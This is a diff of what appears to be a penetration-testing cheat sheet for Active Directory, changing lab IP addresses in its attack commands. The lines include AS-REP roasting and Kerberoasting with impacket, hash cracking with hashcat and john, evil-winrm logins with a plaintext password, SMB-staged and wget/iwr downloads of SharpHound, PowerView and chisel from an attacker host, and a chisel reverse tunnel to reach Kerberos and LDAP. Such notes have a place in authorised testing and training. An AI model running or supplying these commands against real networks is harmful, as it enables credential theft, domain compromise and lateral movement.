@@ -269,7 +269,7 @@ for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 192.168.200.5 mike.co
 
 hashcat -m 18200 hash.kerb $rockyou --force 
 john --wordlist=$rockyou asrephash.txt
-evil-winrm -i 10.10.10.161 -u svc-admin -p paxxword
+evil-winrm -i 192.168.200.5 -u svc-admin -p paxxword
 
 
 
@@ -277,21 +277,21 @@ evil-winrm -i 10.10.10.161 -u svc-admin -p paxxword
 TOOLS
 
 cd ~\tools\AD\
-python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support -username mike -password paxx  
-net use \\192.168.49.124\share /USER:mike helps
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support -username mike -password helps  
+net use \\192.168.162.46\share /USER:mike helps
 
 cd C:\Windows\Temp\
 cd C:\Users\Bob\Downloads\ 
-copy GetUserSPNs.py \\192.168.49.124\share\
-copy GetNPUsers.py \\192.168.49.124\share\
-copy Invoke-Kerberoast.ps1 \\192.168.49.124\share\
-copy getST.py \\192.168.49.124\share\
-copy gMSADumper.py \\192.168.49.124\share\
-copy SharpHound.ps1 \\192.168.49.124\share\
-copy PowerView.ps1 \\192.168.49.124\share\
+copy GetUserSPNs.py \\192.168.162.46\share\
+copy GetNPUsers.py \\192.168.162.46\share\
+copy Invoke-Kerberoast.ps1 \\192.168.162.46\share\
+copy getST.py \\192.168.162.46\share\
+copy gMSADumper.py \\192.168.162.46\share\
+copy SharpHound.ps1 \\192.168.162.46\share\
+copy PowerView.ps1 \\192.168.162.46\share\
 
 python3 -m http.server 80
-powershell wget 192.168.49.124/SharpHound.exe -O SharpHound.exe
+powershell wget 192.168.162.46/SharpHound.exe -O SharpHound.exe
 
 
 ===================================
@@ -439,9 +439,8 @@ PS> PsExec.exe \\mydc cmd.exe
 ===================================
 Port 88 Internal Only - Chisel and Roast
 
-
 netstat -ap tcp
-iwr -uri http://192.168.200.5/chisel_windows_amd64.exe -outfile chisel.exe 
+iwr -uri http://192.168.162.46/chisel_windows_amd64.exe -outfile chisel.exe 
 PS C:\windows\temp> .\chisel.exe client 192.168.200.5:8008 R:88:127.0.0.1:88 R:389:localhost:389 
 kali> /opt/chisel/chisel server -p 8008 --reverse 
 kali> GetUserSPNs.py -request -dc-ip 127.0.0.1 mike.com/bob -save -outputfile GetUserSPNs.out                                                                                                                                              
